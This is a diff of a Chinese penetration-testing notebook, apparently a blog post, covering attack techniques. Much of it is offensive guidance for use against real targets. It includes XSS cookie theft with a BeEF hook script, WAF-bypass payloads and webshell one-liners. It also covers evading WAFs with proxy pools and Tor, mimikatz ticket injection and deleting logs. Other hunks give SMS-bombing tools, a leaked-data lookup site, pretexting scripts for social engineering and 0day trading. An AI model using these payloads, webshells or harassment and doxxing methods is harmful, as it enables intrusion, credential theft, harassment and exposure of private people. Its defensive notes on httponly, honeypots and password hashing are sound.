 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221344762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 一般选默认，默认是获取cookie。也不要太多模块都勾选，非常非常容易导致JS报错，如果报错，那么可能你就收不到对方的中招信息了。尽量只勾选一个或两个。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221517840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 最后XSS平台就会告诉你怎么样执行代码了。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221902641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-图片XSS 获取对方后台 使用讲解    https://woj.app/1785.html
-
-**盗取账号密码**
-
-XSS 之 form表单劫持(通用明文记录)    https://woj.app/1684.html (这里推荐使用平台最新表单劫持插件，无需设置，直接可用)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710164541523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-保存读取：通过读取保存他的数据
-没保存读取：表单劫持(登录框
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071016590266.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221902641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)   
 
 
 
@@ -3671,14 +3610,14 @@ xss平台持久cookie说明 keepsession说明    https://woj.app/1907.html
 
 不用cookie 一个储存XSS对“某btc平台”攻城略地  https://woj.app/3035.html
 
-### XSS其他工具推荐
-
-https://xssfuzzer.com/fuzzer.html
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710215938334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
 
-### beef-xss
+
+
+
+
+#### beef-xss
 
 打开kali，执行`beef-xss`
 命令行启动之后，开启beef终端。默认帐号密码是：beef/beef
@@ -3696,24 +3635,17 @@ beef还是很强大的，入侵成功后可以对对方页面进行跳转或者�
 <script src="http://127.0.0.1:3000/hook.js"></script>
 ```
 
-### self-xss
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052014082162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
 
 ### 防御与绕过
-
+首先需要寻找可注入的参数，以免你的输入被直接过滤掉了。比如通过查看网页的返回你将能找到某个可注入的参数，xss可能出现在任何地方比如你的ip被回显到界面，比如page参数通常也会回显到界面
 #### httponly
 
-管理员只需要在配置文件中修改一句话就可以开启了。开启后无法通过js脚本读取cookie信息，这能一定程度增加了xss获取cookie的难度。但是比如alert等该弹出来的还是会出来的
-
-
-#### 常见防御
+管理员只需要在配置文件中修改一句话就可以开启了。开启后无法通过js脚本读取cookie信息，这能一定程度增加了xss获取cookie的难度。但是比如alert等该弹出来的还是会出来的。
 
 开启httponly，输入过滤，输出过滤等
-PHP：http://www.zuimoge.com/212.html
-JAVA：https://www.cnblogs.com/baixiansheng/p/9001522.html
 
 >我见过一个挺恶心的WAF,微软这个。一旦<后面跟任何字母都算是危险操作 
 >过滤 </xxx> 组合
@@ -3721,163 +3653,17 @@ JAVA：https://www.cnblogs.com/baixiansheng/p/9001522.html
 
 #### 常见绕过
 
-```bash
-详细看 [翻译]绕过XSS检测机制  https://bbs.pediy.com/thread-250852.htm
-
-Name: Cloudflare\
-Payload: <a"/onclick=(confirm)()>click\
-Bypass Technique: 无空格 filler
-
- 
-Name: Wordfence\
-Payload: <a/href=javascript&colon;alert()>click\
-Bypass Technique: 数字符编码
-
- 
-Name: Barracuda\
-Payload: <a/href=&#74;ava%0a%0d%09script&colon;alert()>click\
-Bypass Technique: 数字符编码
-
- 
-Name: Akamai\
-Payload: <d3v/onauxclick=[2].some(confirm)>click\
-Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用
-
- 
-Name: Comodo\
-Payload: <d3v/onauxclick=(((confirm)))``>click\
-Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用
-
- 
-Name: F5\
-Payload: <d3v/onmouseleave=[2].some(confirm)>click\
-Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用
-
- 
-Name: ModSecurity\
-Payload: <details/open/ontoggle=alert()>\
-Bypass Technique: 使用黑名单中缺少的tag（也缺少event handler？）
-
- 
-Name: dotdefender\
-Payload: <details/open/ontoggle=(confirm)()//\
-Bypass Technique: 使用黑名单中缺少的tag；混淆函数调用；备用标签结束
-```
 
 尝试脚本大写
 多个script嵌套
 用img标签
 eval转换
 unicode网络编码
+不常见函数
+
+fuzzy https://xssfuzzer.com/fuzzer.html
 
 
-
-宽字节XSS与宽字节SQL注入的不同在于宽字节注入主要是通过
-
-吃掉转义符再正常注入SQL语句，而宽字节XSS主要使用吃掉转义符后注入恶意xss代码。
-
-案例1：
-
-一般情况下，当我们发现一个输入框，想要插入xss代码在里面：
-
-<input type="text" id="name" value=""/>
-通常做法是通过闭合前面的双引号和注释掉后面的双引号来触发
-
-" /><script>alert(1)</script>//
-但是开发人员一般为了防范我们在其中插入恶意代码，会在显示之前使用过滤器对我们的输入进行转义，我们闭合使用的"被转义为\",这样就导致我们没法闭合。
-
- 
-
-如果使用了GBK等编码，我们就可以利用宽字节xss。构造如下payload：
-
-%c0%22 /><script>alert(1)</script>//
-%c0和%df一样，也是超出了GBK的范围，此时在执行过滤操作时，源代码就变成了
-
-<input type="text" id="name" value="%c0%5c%22 /><script>alert(1)</script>//">
-当过滤器发现了%22，然后加入转义（%5c）,但在解析的时候碰到%c0,于是%5c与%c0合并成一个特殊字符，我们的"得以保留。
-
-<input type="text" id="name" value="%c0%5c%22 /><script>alert(1)</script>//">
-
-
-案例二：
-
-下面是一个PHP的例子，在magic_quotes_gpc=On的情况下，如何触发XSS？
-
-<?php header("Content-Type: text/html;charset=GBK"); ?> 
-
-<head> 
-<title>gb xss</title> 
-</head> 
-<script> a="<?php echo $_GET['x'];?>"; 
-</script>
-
-
-
-我们会想到，需要使用闭合双引号的方法：
-
-gb.php?x=1";alert(1)//
-在magic_quotes_gpc=Off 时源代码会变成：
-
-<script> a="1";alert(1)//";</script>
-
-由于magic_quotes_gpc=On，双引号被转义成\"导致闭合失败
-
-<script> a="1\";alert(1)//";</script>
-
-由于网页头部指定了GBK编码，GBK编码第一字节（高字节）的范围是0x81～0xFE，第二字节（低字节）的范围是0x40～0x7E与0x80～0xFE。
-
-gb.php?x=1%81";alert(1)//
-此时当双引号会继续被转义为\",最终代码如下：
-
-<script> a="1[0x81]\";alert(1)//";</script>
-
-[0x81]\ 组合成了一个合法字符，于是我们的"被保留下来就会产生闭合，我们就成功触发了xss。
-
-GB2312是被GBK兼容的，它的高位范围是0xA1～0xF7，低位范围是0xA1～0xFE（0x5C不在该范围内），把上面的PHP代码的GBK改为GB2312，在浏览器中处理行为同GBK，也许是由于GBK兼容GB2312，浏览器都做了同样的兼容：把GB2312统一按GBK行为处理。
-
- 
-
-宽字节注入防御
-1、使用utf-8，编码宽字节注入；
-
-ps：不仅gbk，韩文、日文等都是宽字节，都有可能存在宽字节注入漏洞。
-
-2、过滤客户端提交的危险字符。
-
-**更多资源**
-xss平台、beef、xss自动化攻击
-
-**新型XSS攻击**
-复制黏贴劫持的新型xss攻击
-**经验**
-难度系数：⭐ 网站罕见指数：90/100
-XSS漏洞仍旧常见，2018年百度、新浪微博、携程仍旧被爆出。但这种漏洞通常不值什么钱，且十分看运气。对于成熟的网页，这种漏洞都被黑客从手工到工具测完了，能挖出来也算你牛逼，而对于新发布的网页这总漏洞是十分常见的。
-
-
-### XSS注入过程
-
-如果你采用的是HTML注入，那么你首先需要寻找可注入的参数，以免你的输入被直接过滤掉了。比如通过查看网页的返回你将能找到某个可注入的参数，xss可能出现在任何地方比如你的ip被回显到界面，比如page参数通常也会回显到界面
-
-```bash
-http://app.data.qq.com/?umod=commentsoutlet&act=count&siteid=3&libid=9&dataid=1480&score=1&func=haoping&_=1353475261886
-
-```
-
-==================================
- 首先通过网页响应判断，是否过滤了 < , > , /符号，如果都没有，那么恭喜你获得了五年难得一遇的什么都不过滤参数，你可以执行一些危险代码了，比如：
-
-
-```bash
-<script>alert(1)</script>
-```
-
-=========
-**参数没有过滤"**
-
-```bash
-http://xxxx.com/search.php?word=第一篇博客
-http://xxxx.com/search.php?word=第一篇博客" onclick="alert(1)
-```
 
 ## CSRF
 
@@ -3938,30 +3724,13 @@ http://对方内网ip/phpmyadmin
 dict://对方内网ip:3306/info
 ftp://对方内网ip:21
 
-## 接口乱用
-
-### 短信轰炸
-
-短信轰炸即抓取注册界面的接口，不断的请求参数，很简单，自己写个脚本或用burpsuite测也能达到效果。
-
-BurpSuite中的一个Tricks：不修改参数，直接重放数据包，对于短信炸弹的测试非常实用
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520141144124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-短信轰炸接口链接: https://pan.baidu.com/s/1Q7Oy_itZvqkS0kGk7WMTxw 提取码: d8nk
-
-
-
-短信轰炸网站，输入电话号码即可 https://sg.iculture.cc/message/d.html
 
 ## DDOS 攻击
-
-NTP DDOS 的原理
-
 常见的方案是通过耗尽目标对象资源来达到攻击效果。
 
 ### 攻击过程
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515184745122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200010553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200048461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
@@ -4000,7 +3769,7 @@ NTP DDOS 的原理
 
 # 经验积累
 
-中间件漏洞请阅读《WEB常见中间件漏洞》
+
 
 ## CMS特性
 
@@ -4025,7 +3794,6 @@ NTP DDOS 的原理
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718140015986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ### 工具
-
 #### 利用
 
 wordpress:wpscan(kali内置)
@@ -4086,7 +3854,7 @@ tp5历史漏洞 https://github.com/Mochazz/ThinkPHP-Vuln
 
 ### PHP
 
-php_getshell.exe
+
 
 #### 变量覆盖漏洞
 
@@ -4216,7 +3984,8 @@ WAF绕过将会更难了，这些绕过都是有条件的。
 安全狗官方下载链接 https://www.safedog.cn/server_safedog.html
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707231011334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-##### 人工智能WAF
+##### 将会流行的WAF
+人工智能WAF如openrasp
 
 #### 市面上常见绕过工具
 
@@ -4255,11 +4024,11 @@ AWVS:扫描速度开最低，设置付费代理（通杀），UA写爬虫
 如果对方对此设置了白名单就可以，一般会对搜索爬虫设置白名单的，默认也是。因为对方希望自己网站被搜索引擎收入
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204226690.png)
 **方案3：代理池**
-有时候WAF会识别代理.且市面上没有什么免费的好的代理，免费代理过期时间基本都短比如几秒样子，使用的人也很多。代理购买，通常买包天，隧道代理(请求一次换一次ip）大概20rmb,做扫描的时候强烈推荐购买付费代理，其中一个购买网站是 https://www.kuaidaili.com/ 
+有时候WAF会识别代理.且市面上没有什么免费的好的代理，免费代理过期时间基本都短比如几秒样子，使用的人也很多。代理购买，通常买包天，隧道代理(请求一次隔段时间换一次IP）大概20rmb,做扫描的时候强烈推荐购买付费代理，其中一个购买网站是 https://www.kuaidaili.com/pricing/#tps
 如果你使用代理，用burpsuite做二级代理才可以抓包
 
 
-经济一点的方法是扫描时使用tor代理，几分钟会自动换ip，前提是你需要一个国外或香港的代理，不然是连接不上TOR匿名网络的。
+经济一点的方法是扫描时使用tor代理，几分钟会自动换ip，前提是你需要一个国外或香港的代理，不然是连接不上TOR匿名网络的，这比你本身的VPN更隐蔽，但速度慢。
 
 
  python代理请求关键代码
@@ -4367,9 +4136,6 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 结合其他漏洞绕过
 
 ### 权限控制拦截
-
-
-
 以下几种方式都可以轻松绕过防护软件，这些木马直接躺在本地服务器检测机制会比输入要小，比如输入不能有base64_decode.但是木马中却是支持的
 
 **变量覆盖**
@@ -4404,29 +4170,58 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 ..\    ..../     ..\.\等
 
 
-## 木马
 
-有一个典型场景，当挖掘到一个潜在的上传漏洞，辛辛苦苦绕过了WAF，结果只上传一个一句话目标，这很可能直接出发主机层面的webshell文件警告，导致功亏一篑。一句话木马通常只有当你用在只是耍耍对面服务器时才用。
+## 蜜罐
+蜜罐技术本质上是一种对攻击方进 欺骗的技术，通过布置一些作为诱饵的主机、网络服务以及操作系统等，诱使攻击方对它们实施攻击，从而可以捕获攻击行为进行分析、溯源、反制等操作。
+
+了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。
+
+蜜罐是企业内部私有的情报收集系统。通过对蜜罐本身的设定以及蜜饵的铺洒与运营引诱黑客前来攻击。所以攻击者触碰陷阱时，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和漏洞。还可以通过窃听攻击之间的联系，收集黑客所用的种种工具，最终掌握他们的攻击路径与手法，知己知彼。
+****
+比较知名的有：hfish
+蜜罐项目汇总 https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md
+
+
+**防止掉入蜜罐**
+
+匿名者需要额外小心，很多时候一不小心点了红队传送的URL，那么我们就很可能被JSONP蜜罐直接获取社交号或者被抓到真实的出口IP
+
+**识别蜜罐**
+
+**欺骗蜜罐**
+
+当我们识别出蜜罐，有以下方式来做反攻：
+
+>①投喂大量脏数据
+>
+>②伪造反向蜜罐，诱导红队进入并误导溯源并消耗红队的精力
+
+## 木马
+一句话木马是最简单的webshell，基本实现思想是把后门数据包的东西当做恶意代码执行。但很多网站已经对一句话木马做防范了，因此通常这些木马要经过一定变形修改才上传，不然可能被封IP
+
+asp一句话木马：
 
 ```bash
-# 把后门数据包的东西当做php代码执行
-<?php @eval($_POST['x'])?>
-
-# 效果与eval类似，但这个词没有eval这么敏感
-<?php assert($_POST['x'])?>
+<%execute(request("value"))%>
 ```
 
-也可参见利用msfvenon生成木马
+php一句话木马：
 
-## 密码
+```bash
+<?php @eval($_POST['x'])?>
+```
 
-如果您想防止攻击者使用他们窃取的密码攻击您，组织或用户可以采取一些步骤。您或您的组织可以采取的第一步是实施多重身份验证 (MFA)。考虑 MFA 的最简单方法是使用您知道的东西、您拥有的东西或您要执行身份验证的东西。“您拥有的东西”可以是智能手机上的身份验证服务，也可以是物理设备，例如 yubico 密钥。“你知道的东西”就是你的密码。添加“您拥有的东西”这一层会增加利用受损密码的难度，从而增强您的防御能力。如果您的组织需要，可以使用生物识别技术添加一个称为“你是谁”的层
+aspx一句话木马：
 
-您或您的组织应采取的下一步措施是增加密码的复杂性/长度要求，以防止被盗密码被用来对付您。增加密码的复杂性和长度将使攻击者更难暴力破解或在单词列表中找到它。例如，在单词列表中很容易找到诸如“passwordPASSWORD”之类的密码，只需 3 分钟即可暴力破解。诸如“1qaz!QAZ”之类的密码可能看起来足够复杂，因为它包含一个特殊字符、一个数字以及大小写字母。然而，由于它的长度，暴力破解只需要2个小时。
+```bash
+<%@ PageLanguage="Jscript"%>
+<%eval(Request.Item["value"])%>
+```
 
-诸如“CASHEWf1veC4B3Rh@mmer”之类的密码不会列在任何单词列表中，因为它是随机单词的组合，其中字母替换为特殊字符和数字。此外，密码的长度会增加暴力破解所需的时间。复杂性和长度的结合导致密码需要 7332 个世纪才能蛮力。
 
-最后，不要以明文形式存储您的密码。如果您维护一个用户数据库，则该数据库中的所有密码都应进行散列和加盐处理。如果您确实需要实施加盐，则必须避免两个常见错误。首先是避免使用硬编码的盐。如果攻击者识别出正在使用什么变量对用户的密码进行加盐，他们就可以生成彩虹表来破解位于数据库中的所有密码。要避免的第二件事是短盐。如果 salt 足够短，攻击者可以创建一个彩虹表，其中包含附加到每个可能密码的所有可能的 salt。但是，如果在数据库中使用长盐，则该数据库的彩虹表将非常大。
+待补充：利用msfvenon生成木马、不死马、免杀
+
+
 
 
 
@@ -4552,15 +4347,6 @@ APP-> WEB APP->其他 APP->逆向
 
 # 社会工程学
 
-tg机器人
-钓鱼 Wifi、社工库、BadUSB、运营商劫持、水坑攻击、鱼叉攻击、信息泄露、钓鱼邮件等等，差点就说绑架员工了）
-
-很多黑客技巧都需要综合使用社会工程学。
-比如：
-
->恶意XSS链接
->csrf链接
-
 ### 套话
 
 友套近乎，“他是我一个之前某某某游戏认识的，您能给我一下他的微信吗，好久没跟他聊了”
@@ -4684,6 +4470,25 @@ http://cnseur/frumphp
 http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group
 
 # 经验
+## IP伪造
+通过互联网传输的数据首先被分成多个数据包，这些数据包独立传输并在最后重新组合。每个数据包都有一个 IP（互联网协议）标头，其中包含有关数据包的信息，包括源 IP 地址和目标 IP 地址。如果ip判定是从请求数据包进行判定的，这样就有可能存在伪造ip绕过的情况。
+ **前端验证绕过**
+以下方法已经快被淘汰
+X-remote-IP:是远端IP，默认来自tcp连接客户端的Ip。可以说，它最准确，无法修改，只会得到直接连服务器客户端IP。如果对方通过代理服务器上网，就发现。获取到的是代理服务器IP了。
+HTTP_CLIENT_IP 在高级匿名代理中，这个代表了代理服务器IP。
+HTTP_X_FORWARDED_FOR = clientip,proxy1,proxy2其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。可以传入任意格式IP.这样结果会带来2大问题，其一，如果你设置某个页面，做IP限制。 对方可以容易修改IP不断请求该页面。 其二，这类数据你如果直接使用，将带来SQL注册，跨站攻击等漏洞
+**TOR**
+类似于分布式的 VPN
+
+**选购代理**
+代理IP分为透明代理、普通匿名代理和高级匿名代理，透明代理并不能隐藏本机真实IP，在使用它的时候，它不但告诉服务器这个人用了代理IP，还把这个人的真实IP告诉服务器，让人很没有安全感；普通匿名代理在使用的时候，会告诉服务器使用了代理，但并不会泄露本机的真实IP；只有高级匿名代理才是最安全的，服务器不知道你使用了代理，也不知道你的真实IP。
+## 界面
+用户登录
+	忘记密码
+	
+	手机号注册：短信轰炸
+	邮箱注册
+	
 ## EXP
 
 **网站**
@@ -4745,7 +4550,7 @@ SEO优化方式劫持搜索引擎结果，引导大众下载恶意软件
 
 ### 溯源
 
-这个技巧可以用在获得更多信息中或者人肉，也可以用在反攻击中，即找出黑客是谁。
+这个技巧可以用在获得更多信息中，也可以用在反攻击中，即找出黑客是谁。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/202107011702168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### 很强大的溯源工具
@@ -4877,7 +4682,6 @@ qq点找回密码，其他与前文已知邮箱操作相同
 
 #### 社工库
 
-笔者这一节花了不少时间，因为资源太少。对于定向攻击或者人肉通过公开的社工库可能就是海底捞针了，但是反向思维通过泄露的数据去攻击某个人，那将会容易得多。
  http://site3.sjk.space/# 
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 5e
@@ -5628,7 +5432,7 @@ mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
 
 ### 一键审计
 
-seay系统可以帮助你建立快捷搜索，全局搜索关键词和函数，还可以帮助你一键测试可能存在的漏洞
+seay系统可以帮助你建立快捷搜索，全局搜索关键词和函数，还可以帮助你一键测试可能存在的漏洞.文件下载链接https://github.com/f1tz/cnseay
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717220353916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ### 数据库监控
@@ -5798,24 +5602,6 @@ VPS
 纯净移动设备
 
 
-### 蜜罐
-
-蜜罐成了今年的重头反制武器，攻击方小心翼翼，清空浏览器缓存、不敢用自己电脑。防守方也因为蜜罐的部署解决了往年被疯狂扫描的想象，由被动变为主动。蜜罐溯源反制终将成为一个常态化趋势~~~
-
-**防止掉入蜜罐**
-
-匿名者需要额外小心，很多时候一不小心点了红队传送的URL，那么我们就很可能被JSONP蜜罐直接获取社交号或者被抓到真实的出口IP
-
-**识别蜜罐**
-
-**欺骗蜜罐**
-
-当我们识别出蜜罐，有以下方式来做反攻：
-
->①投喂大量脏数据
->
->②伪造反向蜜罐，诱导红队进入并误导溯源并消耗红队的精力
-
 ###  日志删除
 
 攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征
@@ -5840,8 +5626,9 @@ touch –r
 
 # 下一步
 
-身为安全工程师，你应该寻找最新动向。如果你感兴趣以下自学网站，你应该写一个代码，去每天自动推送到你的微信。
-
+## 找工作
+刷面试题
+https://www.freebuf.com/jobs
 
 ## 自学
 ①不建议：网上有很多关于不实用的渗透技术介绍文章，不要花大量时间去研究漏洞已经濒临灭绝的，即：
@@ -5875,6 +5662,18 @@ touch –r
 暗月安全培训（听说不错，看完小迪再看）
 
 ## 如何赚钱
+### 靠技术
+
+
+
+**src平台**
+
+**接外包**
+CTF代打
+HW行动面试
+0day交易
+### 技术沾边
+
  **当老师**
 给视频加字幕方法https://www.iculture.cc/knowledge/pig=168
 **发博客赚钱**
@@ -5882,18 +5681,13 @@ touch –r
 **售卖网课**
 **售卖电子书**
 售卖国外电子书，这个网站有大量免费国外电子书网站链接 https://freeditorial.com/
-**src平台**
-
-**接外包**
-
 
 ## 刷题
-
+**经典**
+DVWA
 web山羊
-
-[封神台-掌控安全学院公开靶场](https://hack.zkaq.cn/?a=battle "封神台-掌控安全学院公开靶场")
 实验吧，和bugkuCTF题目要简单一点https://ctf.bugku.com/，适合初学者做
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628215050142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050919362733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 国外靶场vulnhub，更贴近实际环境，靶机需要你从扫描开始对其进行漏洞利用。官网地址 https://www.vulnhub.com/
@@ -6195,11 +5989,10 @@ https://gitee.com/litengfeiyouxiu_admin/Safety-Magazine
 
 ## 大会
 
-比较有影响力的演习有“锁盾”（Locked Shields）、“网络风暴”等。其中“锁盾”由北约卓越网络防御合作中心（CCDCOE，Cooperative Cyber Defence Centre of Excellence）每年举办一次。“网络风暴”由美国国土安全部（DHS）主导，2006年开始，每两年举行一次。
+演习“锁盾”（Locked Shields），每年举办一次
+演习“网络风暴”每两年举行一次
 
-和APT攻击相比，攻防演习相对时长较短，只有1~4周，有个防守目标。而APT攻击目标唯一，时长可达数月至数年，更有隐蔽性。
-
- Black Hat USA
+Black Hat USA
 defcon [Defcon的CTF“世界杯” 是全球最顶级的网络技术攻防竞赛。](https://www.defcon.org/)
 OWASP亚洲峰会
 
@@ -6208,23 +6001,54 @@ OWASP亚洲峰会
 其实各位大可不必一个个收藏知名网络安全学习的链接或工具，由于黑客覆盖面广大多，有很多更新较为及时的导航链接已经为你做好了大部分寻找资源的工作。
 [纳威安全导航](https://navisec.it/)![在这里插入图片描述](https://img-blog.csdnimg.cn/20210509182041213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-## 大佬博客
 
-推荐的这些大佬博客值得关注
-**国内**
-https://blog.csdn.net/qq_29277155
+## 游戏
 
-## 提交漏洞
-### 教育行业平台
+### 红蓝对抗
+国际叫法是蓝队是防守，红队是攻击
+```bash
+考察点：web居多
+前期准备：
+	3-5人分工明确
+	环境
+	WAF脚本（成品WAF不让用）
+	漏洞EXP/POC库
+必备操作：
+	备份网站
+	修改数据库、网页登录默认密码
+	查看是否留有后门账户
+	关闭不必要端口
+	使用命令匹配一句话特性
+	关注是否运行了特殊进程
+	权限高可以设置防火墙或禁止他人修改目录
+预热时间，会给30min的熟悉环境时间
+	防守：
+		部署WAF：
+			AoiAWD
+		扫描后门，官方很可能自带后门：
+			用WAF一键扫描
+			seay
+		文件监控，后门清除，文件自动还原
+		日志记录
+		代码审计
+	攻击：
+		在对方开启文件监控前上传不死马
+	技巧：
+		假界面
+		搅屎棍。发送垃圾数据，隐藏真实数据
+		回首掏。拦截别人的攻击数据包，将别人攻击的数据包转发到其他团队做攻击
+```
+
+### SRC
+ 教育行业平台
 网址：https://src.sjtu.edu.cn
 难度：简单
-范围：广，各大高校（ 写爬虫爬网.edn.cn的网站，大概爬下来有十万左右。）
+范围：广，各大高校
 奖赏：低
 思路：
 直接上扫描工具：AWVS，xray等;
 关注最新爆出来的网站漏洞，有EXP的直接利用exp；假设你发现dedecms爆出最新漏洞，你就利用网络空间搜索如edu.cn & dedecms。
-
-### SRC
+****
 网址：
 女娲补天 https://nvwa.org/index_zh.php
 漏洞盒子 https://www.vulbox.com/projects/list
@@ -6241,7 +6065,7 @@ https://blog.csdn.net/qq_29277155
 在挖漏洞一定要写清楚细节，对于中高危最好录个像。
 刷众测平台，这一般要在补天或者漏洞盒子上拿到排名才有机会参加。
 
-佛系挖：挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。
+佛系挖：适合初学者练手，随缘挖。
 **链接**
 
 CNVD
@@ -6260,64 +6084,49 @@ https://cobalt.io/
 
 
 
-## 待整理：图书推荐
-
+## 图书推荐
+### 基础
 Web之困
-
 白帽子讲浏览器安全(钱文祥)
 Web前端黑客技术揭秘
 XSS跨站脚本攻击剖析与防御
 SQL注入攻击与防御
-
-
 《黑客大揭秘：近源渗透测试》
-
 《内网安全防范：渗透测试实战指南》
-整理整理了2019 年国外卖得火热的黑客书籍，下面列出了一个清单。
-
-排名不分先后。源自：Mejores libros de Hacking 2019-2020: Principiante a Avanzado
-01：Kali Linux Revealed: Mastering the Penetration Testing Distribution（难易度：★★☆☆☆）
-这是一本有关 Kali Linux 的黑客书籍。Kali Linux（以前称为 Backtrack）是可用的最受欢迎的渗透测试发行版。因此，很有必要学习它。尽管不建议初学者使用 Kali Linux，但是如果想使用 Kali Linux，还是建议阅读。
-
-02：The Hackers Playbook 2（难易度：★★★☆☆）
-在这本书中，除了学习如何设置靶场实验室和 Kali Linux 之外，还将了解：OSINT、漏洞扫描、利用、Web应用程序安全性、社会工程学、密码解密等等。最重要的是内容详细，适用于新手。
-
-03：The Hackers Playbook 3（难易度：★★★☆☆）
-它将带领你完成一个渗透测试的所有阶段。可以帮助你配置渗透测试环境，然后带你完成渗透测试、信息收集、Web应用程序利用、网络受到破坏、社会工程技术、物理攻击等。
-
-04：Improving your Penetration Testing Skills（难易度：★★★★☆）
+Kali Linux Revealed: Mastering the Penetration Testing Distribution（难易度：★★☆☆☆）
+这是一本有关 Kali Linux 的黑客书籍
+The Hackers Playbook 2（难易度：★★★☆☆）
